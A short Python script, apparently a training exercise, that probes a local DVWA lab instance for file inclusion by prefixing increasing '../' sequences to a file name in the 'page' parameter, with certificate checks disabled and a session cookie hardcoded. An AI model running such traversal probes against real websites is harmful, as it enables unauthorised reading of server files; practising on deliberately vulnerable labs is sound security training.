import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://127.0.0.1/dvwa/vulnerabilities/fi/?page="
payload = '../'
file_name = 'file4.php'
standard = "File 4"
cookies = dict(security='low', PHPSESSID="t1kqiierd4f8fbrl83aveplg6h")
for i in range(7):
    params = {
        'page': payload*i + file_name
    }
    res = requests.get(url=url, params=params, verify=False, cookies=cookies)
    if res.status_code == 200 and standard in res.text:
        print(f'{url+payload*i+file_name} can be read')
        print("There is a file inclusion!")
    else:
        continue